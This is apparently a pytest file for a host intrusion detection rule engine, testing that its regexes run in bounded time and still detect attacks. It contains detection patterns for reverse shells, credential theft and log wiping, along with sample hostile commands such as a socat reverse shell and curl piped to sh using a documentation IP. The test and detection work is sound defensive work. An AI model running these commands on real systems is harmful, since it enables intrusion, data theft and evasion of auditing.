"""Audit K1: no command line may stall the rule engine.

Denetim K1: hiçbir komut satırı kural motorunu kilitleyememeli.
"""
import random
import re
import time
from pathlib import Path
from re import _constants as C
from re import _parser as P

import pytest

from satsuma import smart_rules
from satsuma.smart_rules import SmartRuleEngine

ROOT = Path(__file__).parents[1]
REGEX_KEYS = ('cmd_regex', 'cmd_regex_cs', 'cmd_not_regex', 'exe_regex')

# The patterns as shipped in 2.1.6 and the linear form that replaced each.
# 2.1.6'daki kalıplar ve her birinin yerini alan doğrusal biçim.
REWRITES = [
    (r'\bbash\b.*-i.*(?:/dev/tcp/|/dev/udp/)', r'^(?>.*?\bbash\b)(?>.*?-i).*(?:/dev/tcp/|/dev/udp/)'),
    (r'\bbash\b.*(?:/dev/tcp/|/dev/udp/).*0>&1', r'^(?>.*?\bbash\b)(?>.*?(?:/dev/tcp/|/dev/udp/)).*0>&1'),
    (r'\bsocat\b.*(?:EXEC|SYSTEM):', r'^(?>.*?\bsocat\b).*(?:EXEC|SYSTEM):'),
    (r'\bsocat\b.*(?:/bin/(?:ba)?sh|/usr/bin/(?:ba)?sh).*TCP', r'^(?>.*?\bsocat\b)(?>.*?(?:/bin/(?:ba)?sh|/usr/bin/(?:ba)?sh)).*TCP'),
    (r'\bcurl\b.+\|\s*(?:ba)?sh\b', r'^(?>.*?\bcurl\b).+\|\s*(?:ba)?sh\b'),
    (r'\bwget\b.+\|\s*(?:ba)?sh\b', r'^(?>.*?\bwget\b).+\|\s*(?:ba)?sh\b'),
    (r'\bawk\b.*?/inet/(?:tcp|udp)/', r'^(?>.*?\bawk\b).*?/inet/(?:tcp|udp)/'),
    (r'\bawk\b.*\|&.*getline', r'^(?>.*?\bawk\b)(?>.*?\|&).*getline'),
    (r'\btelnet\b.+\|\s*/?(?:usr/)?bin/(?:ba)?sh\b', r'^(?>.*?\btelnet\b).+\|\s*/?(?:usr/)?bin/(?:ba)?sh\b'),
    (r'\btar\b.+\|\s*(?:curl|nc|wget)\b', r'^(?>.*?\btar\b).+\|\s*(?:curl|nc|wget)\b'),
    (r'(?:curl|wget)\s+[^|]*\|\s*(?:ba)?sh', r'(?:^|(?<=\|))(?>[^|]*?(?:curl|wget)\s)[^|]*\|\s*(?:ba)?sh'),
    (r'(?:curl|wget)\s+[^|]*\|\s*python3?', r'(?:^|(?<=\|))(?>[^|]*?(?:curl|wget)\s)[^|]*\|\s*python3?'),
    (r'base64\s+(?:-d|--decode)\s*\|.*(?:ba)?sh', r'^(?>.*?base64\s+(?:-d|--decode)\s*\|).*(?:ba)?sh'),
    (r'''python3?\s+-c\s+['"]?.*(?:eval|exec|__import__)\s*\(''', r'^(?>.*?python3?\s+-c\s).*(?:eval|exec|__import__)\s*\('),
    (r'''perl\s+-e\s+['"]?.*eval''', r'^(?>.*?perl\s+-e\s).*eval'),
    (r'script\s+-qc?\s+.*/dev/null', r'^(?>.*?script\s+-qc?\s).*/dev/null'),
    (r'/proc/self/fd/\d+.*(?:exec|sh)', r'^(?>.*?/proc/self/fd/\d).*(?:exec|sh)'),
    (r'gdb\s+-p\s+\d+.*(?:call|inject)', r'^(?>.*?gdb\s+-p\s+\d).*(?:call|inject)'),
    (r'nsenter\s+.*-t\s+1\s+.*(?:mount|ns)', r'^(?>.*?nsenter\s)(?>.*?-t\s+1\s).*(?:mount|ns)'),
    (r'mount\s+.*-o\s+bind.*/(?:host|root)', r'^(?>.*?mount\s)(?>.*?-o\s+bind).*/(?:host|root)'),
    (r'(?:cat|cp|scp|tar)\s+.*\.ssh/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys)', r'^(?>.*?(?:cat|cp|scp|tar)\s).*\.ssh/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys)'),
    (r'''find\s+.*-name\s+['"]?id_rsa''', r'''^(?>.*?find\s).*-name\s+['"]?id_rsa'''),
    (r'(?:cat|cp|grep)\s+.*(?:\.mozilla|\.config/google-chrome|Login Data|keyring)', r'^(?>.*?(?:cat|cp|grep)\s).*(?:\.mozilla|\.config/google-chrome|Login Data|keyring)'),
    (r'(?:env|printenv|set)\s*\|.*(?:grep|curl|nc|wget)', r'^(?>.*?(?:env|printenv|set)\s*\|).*(?:grep|curl|nc|wget)'),
    # 2.2.27: anchored to the command so "systemctl cat x.timer" is not a unit write.
    (r'(?:cp|mv|tee|cat)\s+.*\.(?:service|timer)\s*$', r'^(?>(?:\S*/)?(?:cp|mv|tee|cat)\s).*\.(?:service|timer)\s*$'),
    (r'(?:echo|cat|tee)\s+.*>>?\s*.*(?:\.bashrc|\.bash_profile|\.profile|\.zshrc)', r'^(?>.*?(?:echo|cat|tee)\s)(?>.*?>).*(?:\.bashrc|\.bash_profile|\.profile|\.zshrc)'),
    (r'(?:cp|mv)\s+.*(?:\.bashrc|\.profile)', r'^(?>.*?(?:cp|mv)\s).*(?:\.bashrc|\.profile)'),
    (r'rm\s+.*(?:/var/log/|\.bash_history|wtmp|btmp)', r'^(?>.*?rm\s).*(?:/var/log/|\.bash_history|wtmp|btmp)'),
    (r'journalctl\s+--rotate.*--vacuum', r'^(?>.*?journalctl\s+--rotate).*--vacuum'),
    (r'systemctl\s+(?:stop|disable|mask)\s+.*(?:auditd|firewalld|apparmor|selinux|clamav|suricata|satsuma)', r'^(?>.*?systemctl\s+(?:stop|disable|mask)\s).*(?:auditd|firewalld|apparmor|selinux|clamav|suricata|satsuma)'),
    (r'''touch\s+.*-d\s+['"]?\d{4}''', r'''^(?>.*?touch\s).*-d\s+['"]?\d{4}'''),
    (r'touch\s+.*-t\s+\d{8,}', r'^(?>.*?touch\s).*-t\s+\d{8,}'),
    (r'curl\s+.*(?:-T|--upload-file)', r'^(?>.*?curl\s).*(?:-T|--upload-file)'),
    (r'(?:dig|nslookup)\s+.*\$\(.*(?:cat|base64)', r'^(?>.*?(?:dig|nslookup)\s)(?>.*?\$\().*(?:cat|base64)'),
    (r'tar\s+.*\|\s*(?:nc|ncat|curl)', r'^(?>.*?tar\s).*\|\s*(?:nc|ncat|curl)'),
    (r'openssl\s+enc\s+.*-in\s+.*-out\s+.*\.(?:enc|locked|crypt)', r'^(?>.*?openssl\s+enc\s)(?>.*?-in\s)(?>.*?-out\s).*\.(?:enc|locked|crypt)'),
    (r'find\s+.*-type\s+f\s+.*-exec\s+.*(?:openssl|gpg)', r'^(?>.*?find\s)(?>.*?-type\s+f\s)(?>.*?-exec\s).*(?:openssl|gpg)'),
    (r'rm\s+-rf\s+.*(?:snapshot|backup)', r'^(?>.*?rm\s+-rf\s).*(?:snapshot|backup)'),
]


@pytest.fixture(scope='module')
def engine():
    return SmartRuleEngine(ROOT / 'rules')


def bundled_patterns(engine):
    for rule in engine.rules:
        for key in REGEX_KEYS:
            for pattern in smart_rules._as_list(rule['base_match'].get(key, [])):
                yield rule['_id'], key, str(pattern)


def flags(key):
    return 0 if key == 'cmd_regex_cs' else re.IGNORECASE


def own_words(pattern):
    plain = re.sub(r'\\[sSbBdDwW]', ' ', pattern)
    plain = re.sub(r'\\(.)', r'\1', plain)
    words = list(dict.fromkeys(re.findall(r'[A-Za-z0-9_./=-]{2,}|[|>&$(:]', plain)))
    units = []
    for i, word in enumerate(words):
        units += [word + ' ', word]
        units += [word + ' ' + nxt + ' ' for nxt in words[i + 1:i + 3]]
    return units


def test_every_bundled_regex_is_linear_on_inputs_built_from_its_own_words(engine):
    # 2.1.6 needed 3.9 s for one pattern on 32 KB; a quadratic pattern needs
    # seconds here, a linear one milliseconds.
    size, slow = 131072, []
    for rule_id, key, pattern in bundled_patterns(engine):
        compiled = re.compile(pattern, flags(key))
        for unit in own_words(pattern):
            text = smart_rules._regex_text((unit * (size // len(unit) + 1))[:size])
            started = time.perf_counter()
            compiled.search(text)
            if time.perf_counter() - started > 0.25:
                slow.append((rule_id, pattern, unit))
                break
    assert not slow


def test_no_original_pattern_is_left_and_every_rewrite_is_loaded(engine):
    loaded = {pattern for _, _, pattern in bundled_patterns(engine)}
    assert not [old for old, _ in REWRITES if old in loaded]
    assert not [new for _, new in REWRITES if new not in loaded]


def _sample(tree, rnd):
    out = []
    for op, av in tree:
        if op is C.LITERAL:
            out.append(chr(av))
        elif op is C.NOT_LITERAL:
            out.append(rnd.choice([c for c in 'ax/ -|' if ord(c) != av]))
        elif op is C.ANY:
            out.append(rnd.choice('ax/ -|.:'))
        elif op is C.IN:
            chars, negate = [], False
            for o, a in av:
                if o is C.NEGATE:
                    negate = True
                elif o is C.LITERAL:
                    chars.append(chr(a))
                elif o is C.RANGE:
                    chars.extend(chr(c) for c in range(a[0], a[1] + 1))
                elif o is C.CATEGORY:
                    chars.extend({C.CATEGORY_DIGIT: '0123456789', C.CATEGORY_SPACE: ' '}.get(a, 'a'))
            if negate:
                chars = [c for c in 'ax/ -.:' if c not in chars]
            out.append(rnd.choice(chars or ['a']))
        elif op is C.BRANCH:
            out.append(_sample(rnd.choice(av[1]), rnd))
        elif op is C.SUBPATTERN:
            out.append(_sample(av[-1], rnd))
        elif op in (C.MAX_REPEAT, C.MIN_REPEAT):
            low, high, sub = av
            out.append(''.join(_sample(sub, rnd) for _ in range(rnd.randint(low, min(high, low + 3)))))
        elif op is C.CATEGORY:
            out.append({C.CATEGORY_DIGIT: '7', C.CATEGORY_SPACE: ' '}.get(av, 'a'))
    return ''.join(out)


NOISE = [' ', 'x', 'rm', 'cat', '|', '>', '-i', '-t', '1', '/', 'sh', 'bash', ' | ', '$(', ':', 'TCP', '"', "'", '-exec ', '-out ', '\n']


def _mutate(text, rnd):
    parts = re.split(r'(\s+)', text)
    for _ in range(rnd.randint(0, 4)):
        roll, at = rnd.random(), rnd.randrange(len(parts) + 1)
        if roll < .3:
            parts.insert(at, rnd.choice(NOISE))
        elif roll < .5 and parts:
            del parts[min(at, len(parts) - 1)]
        elif roll < .7 and parts:
            parts.insert(at, parts[rnd.randrange(len(parts))])
        elif roll < .85 and len(parts) > 1:
            a, b = rnd.randrange(len(parts)), rnd.randrange(len(parts))
            parts[a], parts[b] = parts[b], parts[a]
        else:
            parts.insert(at, '\n')
    return ''.join(parts)


# Rewrites deliberately narrowed after 2.1.6; they are linear but no longer equivalent.
NARROWED = {r'(?:cp|mv|tee|cat)\s+.*\.(?:service|timer)\s*$'}


@pytest.mark.parametrize('old,new', [pair for pair in REWRITES if pair[0] not in NARROWED])
def test_rewrite_matches_exactly_what_the_original_matched(old, new):
    # Samples are generated from the original pattern and mutated, so about
    # half of them match; both patterns must agree on every one.
    rnd = random.Random(old)
    tree = P.parse(old, re.IGNORECASE)
    before, after = re.compile(old, re.IGNORECASE), re.compile(new, re.IGNORECASE)
    hits = 0
    for _ in range(3000):
        text = ''.join(_mutate(_sample(tree, rnd), rnd) if rnd.random() < .7 else rnd.choice(NOISE)
                       for _ in range(rnd.randint(1, 3)))
        text = smart_rules._regex_text(text.upper() if rnd.random() < .2 else text)
        expected = before.search(text) is not None
        hits += expected
        assert (after.search(text) is not None) == expected, text
    assert hits > 300


def event(cmd):
    return {'source': 'sys_proc', 'action': 'process_seen', 'cmd': cmd, 'pid': 4242}


def ids(findings):
    return {finding['rule_id'] for finding in findings}


@pytest.mark.parametrize('unit', ['rm ', 'cat ', 'socat ', 'tar ', 'find -type f ', 'a ', ' ', 'bash -i '])
def test_64k_hostile_command_line_is_evaluated_in_bounded_time(engine, unit):
    # 2.1.6: about four minutes for one such process.
    started = time.perf_counter()
    engine.match(event((unit * (65536 // len(unit) + 1))[:65536]))
    assert time.perf_counter() - started < 3


@pytest.mark.parametrize('cmd,rule_id', [
    ('rm -rf /var/log/messages', 'SATSUMA-EVASION-001'),
    ('rm ' + ' ' * 30000 + '/var/log/secure', 'SATSUMA-EVASION-001'),
    ('rm\n/var/log/secure', 'SATSUMA-EVASION-001'),
    ('curl http://198.51.100.7/x | sh', 'SATSUMA-LOL-001'),
    ('cat ~/.mozilla/firefox/abc.default/logins.json', 'SATSUMA-CRED-102'),
    ('find / -type f -exec openssl enc -in {} \\;', 'SATSUMA-RANSOM-001'),
    ('socat TCP:198.51.100.7:4444 EXEC:/bin/bash', 'SATSUMA-EXEC-006'),
])
def test_detection_is_kept_and_padding_or_newlines_do_not_hide_it(engine, cmd, rule_id):
    assert rule_id in ids(engine.match(event(cmd)))


def test_exhausted_budget_is_a_finding_not_a_silent_skip(monkeypatch):
    engine = SmartRuleEngine(ROOT / 'rules')
    monkeypatch.setattr(smart_rules, 'REGEX_BUDGET_SECONDS', -1)
    findings = engine.match(event('rm -rf /var/log/messages'))
    budget = [f for f in findings if f['rule_id'] == smart_rules.REGEX_BUDGET_RULE_ID]
    assert len(budget) == 1
    assert 'SATSUMA-EVASION-001' in budget[0]['unevaluated_rules']
    assert budget[0]['classification'] == 'suspicious'
    assert engine.stats()['regex_budget_exceeded'] == 1
    monkeypatch.setattr(smart_rules, 'REGEX_BUDGET_SECONDS', 0.5)
    assert smart_rules.REGEX_BUDGET_RULE_ID not in ids(engine.match(event('rm -rf /var/log/messages')))


def test_command_line_is_parsed_once_per_event_not_once_per_rule(engine, monkeypatch):
    calls = []
    real = smart_rules.shlex.split
    monkeypatch.setattr(smart_rules.shlex, 'split', lambda s, *a, **k: calls.append(s) or real(s, *a, **k))
    cmd = 'tar czf /tmp/k1-unique-' + 'x' * 64 + '.tgz /home'
    engine.match(event(cmd))
    assert calls.count(cmd) == 1
